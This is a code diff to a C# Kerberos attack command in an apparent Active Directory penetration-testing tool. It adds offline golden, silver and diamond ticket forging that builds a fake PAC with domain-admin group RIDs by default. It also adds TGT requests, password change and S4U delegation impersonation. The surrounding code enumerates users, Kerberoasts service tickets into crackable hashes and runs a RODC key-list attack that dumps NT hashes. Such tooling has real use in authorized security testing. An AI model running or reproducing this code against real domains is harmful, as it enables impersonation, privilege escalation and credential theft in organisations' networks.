@@ -24,11 +24,10 @@ public sealed class KerberosCommand : Command
 	[Mandatory]
 	[Placeholder("kdc")]
 	[Description("Host name or address of the KDC")]
-	public string KdcHost { get; set; } = null!;
+	public string KdcServer { get; set; } = null!;
 
 	[Parameter]
-	[Alias("d")]
-	[Description("Realm (domain), e.g. CORP.LOCAL")]
+	[Description("Realm (domain), e.g. CORP.LOCAL (default: authentication domain -d)")]
 	public string? Domain { get; set; }
 
 	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
@@ -73,6 +72,79 @@ public sealed class KerberosCommand : Command
 	[Description("Explicit SPN(s) to roast: comma list or @file (default: auto-discover via LDAP)")]
 	public string[]? SpnList { get; set; }
 
+	[Parameter]
+	[Description("Forge ticket(s) offline (golden/silver/diamond): requires -ForgeTarget, -ForgeUserSid, -ForgeUser, -TicketEType, -ServerKey")]
+	public SwitchParam Forge { get; set; }
+
+	[Parameter]
+	[Description("Target SPN(s) for -Forge: comma-separated (e.g. cifs/dc01.atlas.local)")]
+	public string? ForgeTarget { get; set; }
+
+	[Parameter]
+	[Description("Impersonated user SID for -Forge (e.g. S-1-5-21-...-500)")]
+	public string? ForgeUserSid { get; set; }
+
+	[Parameter]
+	[Description("Impersonated user name for -Forge (e.g. Administrator)")]
+	public string? ForgeUser { get; set; }
+
+	[Parameter]
+	[Description("Ticket encryption type for -Forge (e.g. Aes256CtsHmacSha1_96, Rc4Hmac)")]
+	public string? TicketEType { get; set; }
+
+	[Parameter]
+	[Description("Hex-encoded key of the service account for -Forge (e.g. krbtgt hash for golden ticket)")]
+	public string? ServerKey { get; set; }
+
+	[Parameter]
+	[Description("KDC key type for -Forge (default: same as -TicketEType)")]
+	public string? KdcEType { get; set; }
+
+	[Parameter]
+	[Description("Hex-encoded KDC key for -Forge (default: same as -ServerKey)")]
+	public string? KdcKey { get; set; }
+
+	[Parameter]
+	[Description("Ticket realm for -Forge (default: -Domain)")]
+	public string? ForgeRealm { get; set; }
+
+	[Parameter]
+	[Description("Group RIDs for -Forge (default: 512,513)")]
+	public string? DomainRids { get; set; }
+
+	[Parameter]
+	[Description("Extra group SIDs for -Forge (default: S-1-18-1)")]
+	public string? ExtraSids { get; set; }
+
+	[Parameter]
+	[Description("Write forged ticket(s) to file (.kirbi or .ccache)")]
+	public string? ForgeOut { get; set; }
+
+	[Parameter]
+	[Description("Request a TGT via AS-REQ with the given credentials (requires -Domain + credentials)")]
+	public SwitchParam RequestTgt { get; set; }
+
+	[Parameter]
+	[Description("Write requested TGT to file (.kirbi or .ccache)")]
+	public string? TgtOut { get; set; }
+
+	[Parameter]
+	[Description("Change the authenticating user's own password via Kerberos (kadmin/changepw)")]
+	public string? ChangePassword { get; set; }
+
+	[Parameter]
+	[Description("Target SPN for S4U impersonation set via -S4UserName (default: cifs/<kdc host>)")]
+	public string? Spn { get; set; }
+
+	[Parameter]
+	[Alias("generate-st")]
+	[Description("Save the S4U service ticket to file (.kirbi or .ccache)")]
+	public string? GenerateSt { get; set; }
+
+	[Parameter]
+	[Description("S4U2Self only, no S4U2Proxy (use with -S4UserName)")]
+	public SwitchParam Self { get; set; }
+
 	protected override void ValidateParameters(ParameterValidationContext context)
 	{
 		if (this.Threads < 1)
@@ -80,20 +152,86 @@ public sealed class KerberosCommand : Command
 		if (this.Timeout < 1)
 			context.LogError(nameof(this.Timeout), "Timeout must be >= 1");
 
-		bool enumerate = this.UserList is not null || this.Domain is not null;
-		if (!enumerate && !this.Roast.IsSet)
-			context.LogError(nameof(this.Domain), "Specify -Domain (optionally with -UserList) to run Kerberos queries, or -Roast with credentials");
+		bool hasRealm = (this.Domain ?? this.Authentication.UserDomain ?? this.ForgeRealm) is not null;
+		bool enumerate = this.UserList is not null || hasRealm;
+		if (!enumerate && !this.Roast.IsSet && !this.Forge.IsSet && !this.RequestTgt.IsSet && this.ChangePassword is null && this.Authentication.S4UserName is null)
+			context.LogError(nameof(this.Domain), "Specify -Domain (optionally with -UserList) to run Kerberos queries, -Roast with credentials, -Forge, -RequestTgt, -ChangePassword, or -S4UserName (S4U)");
 
-		if (this.UserList is not null && this.Domain is null)
-			context.LogError(nameof(this.Domain), "-UserList requires -Domain");
+		if (this.UserList is not null && !hasRealm)
+			context.LogError(nameof(this.Domain), "-UserList requires -Domain (or -d <domain>)");
 
 		// Roast requires credentials
 		if (this.Roast.IsSet)
 		{
 			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
-			if (this.Domain is null)
-				context.LogError(nameof(this.Domain), "-Roast requires -Domain");
+			if (!hasRealm)
+				context.LogError(nameof(this.Domain), "-Roast requires -Domain (or -d <domain>)");
 		}
+
+		if (this.Forge.IsSet)
+		{
+			if (!hasRealm)
+				context.LogError(nameof(this.Domain), "-Forge requires -Domain (or -ForgeRealm, or -d <domain>)");
+			if (string.IsNullOrWhiteSpace(this.ForgeTarget))
+				context.LogError(nameof(this.ForgeTarget), "-Forge requires -ForgeTarget <spn[,spn...]>");
+			if (string.IsNullOrWhiteSpace(this.ForgeUserSid))
+				context.LogError(nameof(this.ForgeUserSid), "-Forge requires -ForgeUserSid <sid>");
+			else
+			{
+				try { SecurityIdentifier.Parse(this.ForgeUserSid); }
+				catch { context.LogError(nameof(this.ForgeUserSid), "-ForgeUserSid is not a valid SID"); }
+			}
+			if (string.IsNullOrWhiteSpace(this.ForgeUser))
+				context.LogError(nameof(this.ForgeUser), "-Forge requires -ForgeUser <name>");
+			if (string.IsNullOrWhiteSpace(this.TicketEType))
+				context.LogError(nameof(this.TicketEType), "-Forge requires -TicketEType (e.g. Aes256CtsHmacSha1_96)");
+			else if (!Enum.TryParse<EType>(this.TicketEType, ignoreCase: true, out _))
+				context.LogError(nameof(this.TicketEType), $"-TicketEType '{this.TicketEType}' is not a valid EType");
+			if (string.IsNullOrWhiteSpace(this.ServerKey))
+				context.LogError(nameof(this.ServerKey), "-Forge requires -ServerKey <hex>");
+			else
+			{
+				try { Convert.FromHexString(this.ServerKey); }
+				catch { context.LogError(nameof(this.ServerKey), "-ServerKey must be hex-encoded"); }
+			}
+			if (this.KdcEType is not null && !Enum.TryParse<EType>(this.KdcEType, ignoreCase: true, out _))
+				context.LogError(nameof(this.KdcEType), $"-KdcEType '{this.KdcEType}' is not a valid EType");
+			if (this.KdcKey is not null)
+			{
+				try { Convert.FromHexString(this.KdcKey); }
+				catch { context.LogError(nameof(this.KdcKey), "-KdcKey must be hex-encoded"); }
+			}
+		}
+
+		if (this.RequestTgt.IsSet)
+		{
+			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
+			if (!hasRealm)
+				context.LogError(nameof(this.Domain), "-RequestTgt requires -Domain (or -d <domain>)");
+		}
+
+		if (this.ChangePassword is not null)
+		{
+			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
+			if (!hasRealm)
+				context.LogError(nameof(this.Domain), "-ChangePassword requires -Domain (or -d <domain>)");
+			if (string.IsNullOrWhiteSpace(this.ChangePassword))
+				context.LogError(nameof(this.ChangePassword), "-ChangePassword requires a new password value");
+		}
+
+		bool s4u = this.Authentication.S4UserName is not null;
+		if (s4u)
+		{
+			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
+			if (!hasRealm)
+				context.LogError(nameof(this.Domain), "S4U requires -Domain (or -d <domain>)");
+			if (this.Authentication.Kdc is null && !string.IsNullOrWhiteSpace(this.KdcServer))
+				this.Authentication.Kdc = new System.Net.DnsEndPoint(this.KdcServer, KerberosClient.KdcTcpPort);
+		}
+		if (this.Self.IsSet && !s4u)
+			context.LogError(nameof(this.Self), "-Self requires -S4UserName <user>");
+		if ((this.Spn is not null || this.GenerateSt is not null) && !s4u)
+			context.LogError(nameof(this.Spn), "-Spn/-GenerateSt require -S4UserName <user>");
 
 		if ((this.RodcNo.HasValue || this.RodcKey is not null))
 		{
@@ -110,9 +248,26 @@ public sealed class KerberosCommand : Command
 
 	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
 	{
-		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new DnsEndPoint(this.KdcHost, KerberosClient.KdcTcpPort)));
+		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new DnsEndPoint(this.KdcServer, KerberosClient.KdcTcpPort)));
 
-		string realm = this.Domain!.ToUpperInvariant();
+		string realm = (this.Domain ?? this.Authentication.UserDomain ?? this.ForgeRealm ?? string.Empty).ToUpperInvariant();
+		if (string.IsNullOrEmpty(realm))
+		{
+			AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", "no realm specified (use -Domain or -d <domain>)");
+			return 1;
+		}
+
+		if (this.Forge.IsSet)
+			return await this.RunForgeAsync(krb, realm, cancellationToken).ConfigureAwait(false);
+
+		if (this.RequestTgt.IsSet)
+			return await this.RunRequestTgtAsync(krb, realm, cancellationToken).ConfigureAwait(false);
+
+		if (this.ChangePassword is not null)
+			return await this.RunChangePasswordAsync(krb, realm, cancellationToken).ConfigureAwait(false);
+
+		if (this.Authentication.S4UserName is not null)
+			return await this.RunS4UAsync(krb, realm, cancellationToken).ConfigureAwait(false);
 
 		// Default probe list when only a domain was given.
 		List<string> users = string.IsNullOrEmpty(this.UserList)
@@ -143,7 +298,7 @@ public sealed class KerberosCommand : Command
 					// GetASInfo returns successfully when the KDC answers
 					// KDC_ERR_PREAUTH_REQUIRED -> the account exists.
 					KdcInfo info = await krb.GetASInfo(realm, user, null, timeoutCts.Token).ConfigureAwait(false);
-					AtlasConsole.Success($"{this.KdcHost}:{KdcPort}", $"user: {user}");
+					AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"user: {user}");
 				}
 				catch (OperationCanceledException) when (token.IsCancellationRequested)
 				{
@@ -152,31 +307,31 @@ public sealed class KerberosCommand : Command
 				catch (OperationCanceledException)
 				{
 					Interlocked.Increment(ref failures);
-					AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
+					AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
 				}
 				catch (InvalidOperationException iox) when (iox.Message.Contains("preauthentication", StringComparison.OrdinalIgnoreCase))
 				{
 					// KDC returned an actual TGT without pre-auth -> AS-REP roastable
-					AtlasConsole.Warn($"{this.KdcHost}:{KdcPort}", $"user: {user} - DOES NOT REQUIRE PRE-AUTH (AS-REP roastable)");
+					AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - DOES NOT REQUIRE PRE-AUTH (AS-REP roastable)");
 				}
 				catch (KerberosException kex)
 				{
 					switch (kex.KerberosErrorCode)
 					{
 						case KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED:
-							AtlasConsole.Success($"{this.KdcHost}:{KdcPort}", $"user: {user}");
+							AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"user: {user}");
 							break;
 						case KerberosErrorCode.KDC_ERR_C_PRINCIPAL_UNKNOWN:
-							AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"user: {user} - not found");
+							AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"user: {user} - not found");
 							break;
 						case KerberosErrorCode.KDC_ERR_CLIENT_REVOKED:
-							AtlasConsole.Warn($"{this.KdcHost}:{KdcPort}", $"user: {user} - DISABLED or LOCKED OUT");
+							AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - DISABLED or LOCKED OUT");
 							break;
 						case KerberosErrorCode.KDC_ERR_WRONG_REALM:
-							AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"wrong realm '{realm}' for this KDC");
+							AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"wrong realm '{realm}' for this KDC");
 							break;
 						default:
-							AtlasConsole.Warn($"{this.KdcHost}:{KdcPort}", $"user: {user} - {kex.KerberosErrorCode}");
+							AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - {kex.KerberosErrorCode}");
 							break;
 					}
 				}
@@ -184,7 +339,7 @@ public sealed class KerberosCommand : Command
 				{
 					Interlocked.Increment(ref failures);
 					string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
-					AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"user: {user} - {msg}");
+					AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"user: {user} - {msg}");
 				}
 			}).ConfigureAwait(false);
 
@@ -219,9 +374,9 @@ public sealed class KerberosCommand : Command
 		}
 		else
 		{
-			string dcHost = (this.NetParameters?.HostAddress is { Length: > 0 } ha) ? ha[0] : this.KdcHost;
+			string dcHost = (this.NetParameters?.HostAddress is { Length: > 0 } ha) ? ha[0] : this.KdcServer;
 			spns = await this.DiscoverSpnsAsync(dcHost, cancellationToken).ConfigureAwait(false);
-			AtlasConsole.Info($"{this.KdcHost}:{KdcPort}", $"{spns.Count} SPN(s) discovered via LDAP");
+			AtlasConsole.Info($"{this.KdcServer}:{KdcPort}", $"{spns.Count} SPN(s) discovered via LDAP");
 		}
 
 		int failures = 0;
@@ -242,7 +397,7 @@ public sealed class KerberosCommand : Command
 					timeoutCts.Token).ConfigureAwait(false);
 
 				string hash = tkt.GetTicketHash();
-				AtlasConsole.Success($"{this.KdcHost}:{KdcPort}", $"{spn} - {hash}");
+				AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"{spn} - {hash}");
 			}
 			catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
 			{
@@ -251,12 +406,12 @@ public sealed class KerberosCommand : Command
 			catch (OperationCanceledException)
 			{
 				Interlocked.Increment(ref failures);
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{spn} - timed out after {this.Timeout}s");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - timed out after {this.Timeout}s");
 			}
 			catch (KerberosException kex)
 			{
 				Interlocked.Increment(ref failures);
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{spn} - {kex.KerberosErrorCode}");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - {kex.KerberosErrorCode}");
 			}
 			catch (Exception ex)
 			{
@@ -264,7 +419,7 @@ public sealed class KerberosCommand : Command
 				string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
 				if (string.IsNullOrWhiteSpace(msg))
 					msg = ex.GetType().Name;
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{spn} - {msg}");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - {msg}");
 			}
 		}
 
@@ -391,6 +546,159 @@ public sealed class KerberosCommand : Command
 	// TGS-REQ to krbtgt carrying KERB-KEY-LIST-REQ; the KERB-KEY-LIST-REP in
 	// the response carries the user's long-term keys.
 
+	// ---- Ticket forging ([MS-PAC] golden/silver/diamond) ----
+	// Mirrors Titanis tools/security/Kerb/ForgeCommand.cs.
+
+	private async Task<int> RunForgeAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
+	{
+		string ticketRealm = (this.ForgeRealm ?? realm).ToUpperInvariant();
+		string clientRealm = ticketRealm;
+
+		string accountName = this.ForgeUser!;
+		string userDomain = ticketRealm;
+		int bs = accountName.IndexOf('\\');
+		if (bs > 0) { userDomain = accountName[..bs]; accountName = accountName[(bs + 1)..]; }
+		int at = accountName.IndexOf('@');
+		if (at > 0) { clientRealm = accountName[(at + 1)..].ToUpperInvariant(); accountName = accountName[..at]; }
+
+		var userSid = SecurityIdentifier.Parse(this.ForgeUserSid!);
+		var subAuths = userSid.GetSubauthorities();
+		var domainSid = new SecurityIdentifier(userSid.IdentifierAuthority, subAuths[..^1]);
+		uint userRid = userSid.Rid;
+
+		uint[] domainRids = (this.DomainRids is null)
+			? [0x200, 0x201]
+			: this.DomainRids.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(uint.Parse).ToArray();
+		SecurityIdentifier[] extraSids = (this.ExtraSids is null)
+			? [SecurityIdentifier.Parse("S-1-18-1")]
+			: this.ExtraSids.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(s => SecurityIdentifier.Parse(s)).ToArray();
+
+		EType ticketEType = Enum.Parse<EType>(this.TicketEType!, ignoreCase: true);
+		var serverKey = new SessionKey(krb.GetEncProfile(ticketEType), Convert.FromHexString(this.ServerKey!));
+		SessionKey? kdcKey = null;
+		if (this.KdcKey is not null)
+		{
+			EType kdcEType = (this.KdcEType is null) ? ticketEType : Enum.Parse<EType>(this.KdcEType, ignoreCase: true);
+			kdcKey = new SessionKey(krb.GetEncProfile(kdcEType), Convert.FromHexString(this.KdcKey));
+		}
+
+		var targets = this.ForgeTarget!.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(ParseSpn).ToList();
+		var upn = new UserPrincipalName(accountName, clientRealm);
+		var now = DateTime.UtcNow;
+		var sessionKey = new SessionKey(krb.GetEncProfile(EType.Aes128CtsHmacSha1_96), System.Security.Cryptography.RandomNumberGenerator.GetBytes(16));
+
+		var logonInfo = new LogonInfo
+		{
+			LogonTime = now,
+			PasswordLastSet = now,
+			EffectiveName = accountName,
+			FullName = accountName,
+			LogonScript = string.Empty,
+			ProfilePath = string.Empty,
+			HomeDirectory = string.Empty,
+			HomeDirectoryDrive = string.Empty,
+			LogonCount = 0xA5,
+			BadPasswordCount = 0,
+			UserId = userRid,
+			PrimaryGroupId = 0x201,
+			UserFlags = 0,
+			UserSessionKey = null,
+			LogonServer = string.Empty,
+			LogonDomainName = userDomain,
+			LogonDomainSid = domainSid,
+			UserAccountControl = SamUserAccountFlags.NormalAccount | SamUserAccountFlags.DontExpirePassword,
+			ResourceGroupDomainSid = domainSid,
+		};
+		logonInfo.SetGroupIds(Array.ConvertAll(domainRids, r =>
+			new RidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.Enabled | SidAttributes.EnabledByDefault)));
+		logonInfo.SetExtraSids(Array.ConvertAll(extraSids, r =>
+			new SidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.EnabledByDefault | SidAttributes.Enabled)));
+		var upnDnsInfo = new UpnDnsInfo();
+
+		const KdcOptions options = KdcOptions.Canonicalize | KdcOptions.Preauthenticated | KdcOptions.Initial | KdcOptions.Renewable | KdcOptions.Forwardable;
+		var tickets = new List<TicketInfo>();
+		foreach (var target in targets)
+		{
+			cancellationToken.ThrowIfCancellationRequested();
+			var forged = krb.ForgeTicket(
+				options, upn, clientRealm, ticketRealm, target, ticketRealm,
+				sessionKey, serverKey, now, now.AddHours(10), now, now.AddHours(24),
+				logonInfo, upnDnsInfo, kdcKey);
+			tickets.Add(forged);
+			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"forged {target} for {upn} ({userSid}) - {forged.GetTicketHash()}");
+		}
+		krb.ImportTickets(tickets);
+
+		if (this.ForgeOut is not null)
+		{
+			var bytes = krb.ExportTickets(tickets, KerberosClient.GetFormatFromFileName(this.ForgeOut));
+			await File.WriteAllBytesAsync(this.ForgeOut, bytes, cancellationToken).ConfigureAwait(false);
+			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote {tickets.Count} ticket(s) to {this.ForgeOut}");
+		}
+		return 0;
+	}
+
+	private async Task<int> RunRequestTgtAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
+	{
+		KerberosCredential cred = this.BuildCredential(realm);
+		TicketInfo tgt = await krb.RequestInitialTicket(realm, cred, null, null, null, cancellationToken).ConfigureAwait(false);
+		krb.ImportTickets([tgt]);
+		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"TGT for {tgt.ClientName}@{tgt.ClientRealm} until {tgt.EndTime:yyyy-MM-dd HH:mm:ss} ({tgt.TargetSpn})");
+		if (this.TgtOut is not null)
+		{
+			var bytes = krb.ExportTickets([tgt], KerberosClient.GetFormatFromFileName(this.TgtOut));
+			await File.WriteAllBytesAsync(this.TgtOut, bytes, cancellationToken).ConfigureAwait(false);
+			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote TGT to {this.TgtOut}");
+		}
+		return 0;
+	}
+
+	private async Task<int> RunChangePasswordAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
+	{
+		KerberosCredential cred = this.BuildCredential(realm);
+		TicketInfo ticket = await krb.RequestInitialTicket(realm, cred, KerberosClient.ChangePwSpn, null, null, cancellationToken).ConfigureAwait(false);
+		await krb.ChangePassword(
+			new DnsEndPoint(this.KdcServer, 464),
+			ticket,
+			cred,
+			this.ChangePassword!,
+			HostAddress.FromIPAddress(System.Net.IPAddress.Any),
+			cancellationToken).ConfigureAwait(false);
+		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"password changed for '{cred.UserName}@{cred.Realm}'");
+		return 0;
+	}
+
+	// ---- S4U constrained-delegation impersonation (NetExec --delegate) ----
+
+	private async Task<int> RunS4UAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
+	{
+		KerberosCredential cred = this.BuildCredential(realm);
+		string spnText = this.Spn ?? $"cifs/{this.KdcServer}";
+		SecurityPrincipalName target = ParseSpn(spnText);
+		var rawS4u = this.Authentication.S4UserName!;
+		string s4uName = rawS4u.UserName;
+		var s4uUser = new UserPrincipalName(s4uName, string.IsNullOrEmpty(rawS4u.Realm) ? realm : rawS4u.Realm);
+
+		var ticketParams = new TicketParameters
+		{
+			Options = KdcOptions.Canonicalize | KdcOptions.Forwardable,
+			S4UserName = s4uUser,
+		};
+		if (this.Self.IsSet)
+			ticketParams.S4ProxyService = target;
+
+		TicketInfo st = await krb.GetTicketAsync(target, realm, cred, ticketParams, cancellationToken).ConfigureAwait(false);
+		krb.ImportTickets([st]);
+		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"S4U{(this.Self.IsSet ? "2Self" : "2Self+Proxy")} ST for {s4uUser} to {target} until {st.EndTime:yyyy-MM-dd HH:mm:ss}");
+		if (this.GenerateSt is not null)
+		{
+			var bytes = krb.ExportTickets([st], KerberosClient.GetFormatFromFileName(this.GenerateSt));
+			await File.WriteAllBytesAsync(this.GenerateSt, bytes, cancellationToken).ConfigureAwait(false);
+			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote service ticket to {this.GenerateSt}");
+		}
+		return 0;
+	}
+
 	private sealed record KeyListTarget(string User, uint? Rid);
 
 	private async Task<int> RunKeyListAttackAsync(KerberosClient krb, string realm, List<string> users, CancellationToken cancellationToken)
@@ -413,7 +721,7 @@ public sealed class KerberosCommand : Command
 			}
 
 			if (rid is null)
-				AtlasConsole.Warn($"{this.KdcHost}:{KdcPort}", $"no RID for '{user}' - using placeholder identity in PAC (provide 'user:rid' for PAC-hardened DCs)");
+				AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"no RID for '{user}' - using placeholder identity in PAC (provide 'user:rid' for PAC-hardened DCs)");
 			uint effectiveRid = rid ?? 1000;
 
 			cancellationToken.ThrowIfCancellationRequested();
@@ -424,7 +732,7 @@ public sealed class KerberosCommand : Command
 				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));
 
 				string ntHash = await this.KeyListSingleAsync(krb, rodcProfile, realm, domainSid, user, effectiveRid, rodcKeyBytes, timeoutCts.Token).ConfigureAwait(false);
-				AtlasConsole.Success($"{this.KdcHost}:{KdcPort}", $"{realm}\\{user}:{ntHash}");
+				AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"{realm}\\{user}:{ntHash}");
 			}
 			catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
 			{
@@ -433,12 +741,12 @@ public sealed class KerberosCommand : Command
 			catch (OperationCanceledException)
 			{
 				Interlocked.Increment(ref failures);
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
 			}
 			catch (KerberosException kex)
 			{
 				Interlocked.Increment(ref failures);
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{user} - {kex.KerberosErrorCode}");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - {kex.KerberosErrorCode}");
 			}
 			catch (Exception ex)
 			{
@@ -446,7 +754,7 @@ public sealed class KerberosCommand : Command
 				string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
 				if (string.IsNullOrWhiteSpace(msg))
 					msg = ex.GetType().Name;
-				AtlasConsole.Fail($"{this.KdcHost}:{KdcPort}", $"{user} - {msg}");
+				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - {msg}");
 			}
 		}
 
@@ -560,7 +868,7 @@ public sealed class KerberosCommand : Command
 		}
 
 		if (ntHash is not null)
-			AtlasConsole.Info($"{this.KdcHost}:{KdcPort}", $"{realm}\\{user} additional keys: " + string.Join(", ", others));
+			AtlasConsole.Info($"{this.KdcServer}:{KdcPort}", $"{realm}\\{user} additional keys: " + string.Join(", ", others));
 		return ntHash ?? others.FirstOrDefault() ?? string.Empty;
 	}
 }
